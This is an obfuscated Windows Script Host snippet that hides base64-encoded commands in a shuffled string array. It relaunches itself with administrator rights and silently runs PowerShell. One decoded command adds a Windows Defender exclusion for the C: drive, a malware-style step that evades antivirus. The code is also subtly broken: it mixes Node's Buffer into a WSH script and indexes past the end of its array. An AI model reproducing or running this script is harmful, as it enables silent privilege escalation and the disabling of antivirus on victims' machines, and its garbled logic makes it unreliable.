(function () {
    function _0x1a(b, c) {
        var d = function (e) {
            while (--e) {
                b['push'](b['shift']());
            }
        };
        d(++c);
    }
    var f = ['cG93ZXJzaGVsbCAtZW5jIA==', 'cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA', 'WScript.Arguments.Named.Exists', 'WScript.FullName', 'WScript.ScriptFullName', 'ActiveXObject', 'Shell.Application', 'ShellExecute', 'WScript', 'Quit', 'Wscript.Shell', 'cG93ZXJzaGVsbCAtZW5jIA==', 'cG93ZXJzaGVsbCAtZW5jIA=='];
    _0x1a(f, 0x83);
    var g = function (b, c) {
        b = b - 0x0;
        return f[b];
    };

    function _0x2a(a) {
        var h = Buffer.from(a, 'base64').toString('utf-8');
        return h;
    }

    function EnsureElevatedPrivileges() {
        if (!eval(g(0x2))('elevate')) {
            new eval(g(0x5))(g(0x6))[g(0x7)](eval(g(0x3)), '"' + eval(g(0x4)) + '" /elevate', '', 'runas', 0x1);
            eval(g(0x8))[g(0x9)]();
        }
    }

    EnsureElevatedPrivileges();

    var WshShell = new eval(g(0xa));

    var commands = [
        g(0xb),
        g(0xc),
        g(0xd)
    ];

    for (var i = 0; i < commands.length; i++) {
        var cmd = _0x2a(commands[i]);
        WshShell.run(cmd, 0x0, false);
    }

})();
